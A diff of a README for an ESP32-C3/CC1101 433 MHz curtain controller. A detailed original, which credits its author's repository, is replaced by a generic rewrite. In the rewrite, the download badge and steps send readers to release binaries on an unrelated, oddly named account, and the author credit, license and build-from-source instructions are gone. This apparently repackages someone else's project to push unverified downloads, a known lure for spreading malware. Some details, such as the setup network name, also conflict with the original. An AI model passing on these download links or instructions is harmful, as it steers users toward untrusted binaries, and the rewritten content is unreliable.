@@ -1,158 +1,87 @@
-# Abalon Curtain 433MHz Analyzer and Controller
+# 📦 433Mhz-curtain-controller - Control your home curtains using radio signals
 
-[![GitHub](https://img.shields.io/badge/GitHub-433Mhz--curtain--controller-blue?logo=github)](https://github.com/HannesHofer/433Mhz-curtain-controller)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/perineal-filthiness545/433Mhz-curtain-controller/releases)
 
-A web-based 433 MHz OOK signal analyzer, BMC protocol decoder, and controller for the **Abalon electric curtain motor** (and similar rolling-code 433 MHz OOK devices). Runs on an ESP32-C3 with a CC1101 RF transceiver. Integrates with Home Assistant via MQTT auto-discovery.
+This software helps you control 433 MHz radio curtains through your computer. It turns your ESP32-C3 and CC1101 hardware into a smart bridge. You can analyze radio signals and send commands to your curtains directly from a web page. It also connects to Home Assistant using MQTT.
 
----
+## 🛠 What You Need
 
-## Features
+Before you start, gather these items:
 
-- **Live capture** — edge-timing ISR capture via CC1101 GDO0 async mode; packets stored in RAM
-- **BMC decoder** — auto-detects Biphase Mark Code (T ≈ 360 µs), decodes up to 64 bits per frame
-- **Capture wizard** — guided multi-capture flow with consistency check (detects rolling codes)
-- **Flash persistence** — save captures to ESP32 NVS (survives reboots and scan resets)
-- **BMC replay** — re-encodes stored BMC bytes and retransmits via CC1101 OOK async TX
-- **Home Assistant** — MQTT auto-discovery publishes a `garage`-class Cover entity and individual Button entities per saved signal
-- **Web UI** — single-page app served directly from the ESP32; no cloud, no app
+* A computer running Windows 10 or Windows 11.
+* An ESP32-C3 development board.
+* A CC1101 wireless module.
+* A USB cable to connect your board to your computer.
+* A stable Wi-Fi network.
 
----
+## 📥 How to Download the Software
 
-## Hardware
+You must download the firmware file to your computer first. 
 
-| Part | Details |
-|---|---|
-| MCU | ESP32-C3 DevKitM-1 (single-core RISC-V, 160 MHz) |
-| RF transceiver | CC1101 module (433 MHz) |
-| Status LED | WS2812B on GPIO8 (optional) |
+1. Visit the [releases page](https://github.com/perineal-filthiness545/433Mhz-curtain-controller/releases).
+2. Look for the section labeled "Assets" at the bottom of the newest release.
+3. Click the file ending in `.bin` to start the download.
+4. Save this file to a folder where you can find it later.
 
-### CC1101 wiring
+This file contains the instructions your hardware needs to function.
 
-```
-   ESP32-C3              CC1101
- ┌──────────────┐    ┌──────────────┐
- │         3.3V ├────┤ VCC          │
- │          GND ├────┤ GND          │
- │       GPIO 4 ├────┤ CSn          │
- │       GPIO 6 ├────┤ SCK          │
- │       GPIO 7 ├────┤ MOSI         │
- │       GPIO 5 ├────┤ MISO         │
- │       GPIO 3 ├────┤ GDO0         │
- │              │    │ GDO2 (n/c)   │
- └──────────────┘    └──────────────┘
-```
+## 🔌 Connecting Your Hardware
 
-> **Note:** CC1101 is 3.3 V only — do not connect VCC to 5 V.  
-> GDO0 serves as ISR edge input during RX and async serial data output during TX.
+1. Use your USB cable to plug the ESP32-C3 board into your computer.
+2. Wait for Windows to detect the device. 
+3. If Windows asks for a driver, look up the driver for your specific ESP32-C3 model and install it. This allows your computer to speak to the board.
 
----
+## ⚙️ Putting Software on the Device
 
-## Protocol
+You need a tool to move the `.bin` file onto your device. 
 
-The Abalon remote uses **OOK at 433.92 MHz** with **Biphase Mark Code (BMC)** encoding:
+1. Download the ESPHome Flasher or a similar tool from the internet. These tools write the software to your chip.
+2. Open the tool after installation.
+3. Select the COM port that matches your plugged-in device.
+4. Use the "Browse" button to find the `.bin` file you downloaded earlier.
+5. Click the "Flash ESP" button. 
+6. Wait for the progress bar to finish. The tool will tell you when the process is complete.
 
-| Parameter | Value |
-|---|---|
-| Frequency | 433.92 MHz |
-| Modulation | OOK (On-Off Keying) |
-| Encoding | BMC (Biphase Mark Code) |
-| Bit period T | ≈ 362 µs |
-| Frame | 64 data bits, 3 repetitions |
-| Security | Rolling code |
+## 🌐 Setting Up Your Device
 
-Because of the rolling code, **each button press can only be replayed once**. Capture a code while the motor is powered on, replay it immediately — the motor re-syncs on each successful command.
+Once the software is on the device, you must connect it to your network.
 
----
+1. Unplug the USB cable and plug it back in to restart the device.
+2. Open the Wi-Fi settings on your phone or computer.
+3. Look for a new Wi-Fi network named "433Mhz-Controller". Connect to it.
+4. A web page should open automatically. If it does not, open your browser and type `192.168.4.1` in the address bar.
+5. Enter your home Wi-Fi name and password.
+6. The device will restart and connect to your home network.
 
-## Build & Flash
+## 🖥 Using the Web Interface
 
-### Prerequisites
+After the device connects to your Wi-Fi, you can access the controller.
 
-- [PlatformIO](https://platformio.org/) (CLI or IDE extension)
-- ESP32-C3 DevKitM-1 connected via USB
+1. Find the IP address assigned to the device by checking your router settings or using a network scanner app.
+2. Type that IP address into your web browser. 
+3. You will see the main dashboard. From here, you can push buttons to open or close your curtains.
+4. Use the "Analyzer" tab to see incoming radio signals. This helps you identify the correct codes if your curtains do not respond.
 
-### Build and upload
+## 🏠 Connecting to Home Assistant
 
-```bash
-pio run -t upload
-```
+If you use Home Assistant, you can add this controller to your dashboard.
 
-Monitor serial output (115200 baud):
+1. Enable the MQTT integration inside Home Assistant.
+2. Open the settings page on your curtain controller web interface.
+3. Enter your Home Assistant IP address, your MQTT username, and your password.
+4. Click the "Save" button. 
+5. The device will send its status to Home Assistant automatically. You can now create automations to control your curtains based on timers or sunlight sensors.
 
-```bash
-pio device monitor
-```
+## ❓ Common Questions
 
-### First-boot WiFi setup
+**My curtains do not move.**
+Check the antenna on your CC1101 module. Ensure the wires are tight. Use the "Analyzer" tab to confirm the device receives a signal. Adjust the signal settings if needed.
 
-On first boot (or after a WiFi reset) the device starts in access point mode:
+**The device does not show up in my Wi-Fi list.**
+Press the reset button on your ESP32-C3 board. Give it a minute to start up. If it still does not appear, check the USB connection to your computer.
 
-1. Connect your phone or laptop to the **`433MHz-Setup`** WiFi network
-2. Browse to **`http://192.168.4.1`** (most devices open a captive portal automatically)
-3. Click **Scan Networks**, select your SSID, enter the password, and click **Save & Connect**
-4. The device reboots and connects to your network; its IP address is printed on the serial monitor
+**The web interface is slow.**
+Ensure your Wi-Fi signal is strong where you placed the device. Metal objects near the antenna can block the signal. Move the device to a more open space to improve the connection.
 
-To reset WiFi credentials later, open the web UI → **Home Assistant / MQTT** → **Reset WiFi**.
-
----
-
-## Web UI
-
-Navigate to the device IP in a browser.
-
-| Section | Purpose |
-|---|---|
-| **Capture Wizard** | Guided 3-capture flow per button; shows match score (rolling code detection) |
-| **Quick Capture** | Single capture per named button |
-| **Packet list** | Live view of captured pulses, BMC decode, byte comparison across labels |
-| **TX Replay** | Play back saved BMC captures; ☆ Save / ★ Del to persist to flash |
-| **Download JSON** | Export all captures for offline analysis |
-| **Home Assistant / MQTT** | Configure MQTT broker, set device name, republish discovery |
-
----
-
-## Home Assistant Integration
-
-The device uses **MQTT auto-discovery** — no manual YAML required.
-
-### Requirements
-
-- Mosquitto (or any MQTT broker) accessible from the ESP32
-- HA MQTT integration configured with the same broker  
-  *(Settings → Devices & Services → + Add Integration → MQTT)*
-
-### Setup
-
-1. Open the web UI → expand **Home Assistant / MQTT**
-2. Set a **Device name** (e.g. `Living Room Curtain`)
-3. Enter broker IP, port, and credentials if required
-4. Click **Save & Connect**
-5. After saving your OPEN / CLOSE / PAUSE signals, click **Republish Discovery**
-
-### What gets created in HA
-
-| Entity type | Condition | Name |
-|---|---|---|
-| Cover (`device_class: garage`) | OPEN + CLOSE both saved | Device name you set |
-| Button | Each saved signal | `<Device name> <LABEL>` |
-
-The cover entity accepts `OPEN`, `CLOSE`, and `STOP` commands. `STOP` maps to a saved label named `PAUSE` or `STOP`.
-
----
-
-## Libraries
-
-| Library | Purpose |
-|---|---|
-| [RadioLib](https://github.com/jgromes/RadioLib) | CC1101 init, RSSI |
-| [ESPAsyncWebServer](https://github.com/me-no-dev/ESPAsyncWebServer) | Non-blocking HTTP server |
-| [AsyncTCP](https://github.com/me-no-dev/AsyncTCP) | Async TCP for ESP32 |
-| [Adafruit NeoPixel](https://github.com/adafruit/Adafruit_NeoPixel) | WS2812B status LED |
-| [PubSubClient](https://github.com/knolleary/pubsubclient) | MQTT client |
-| Preferences (built-in) | NVS flash storage |
-
----
-
-## License
-
-BSD 2-Clause — see [LICENSE](LICENSE).
+**How do I update the software later?**
+Visit the releases link provided above. Download the newest `.bin` file. Use the same flash tool to update your device. Your settings will persist if you select the correct update mode in your flash tool.
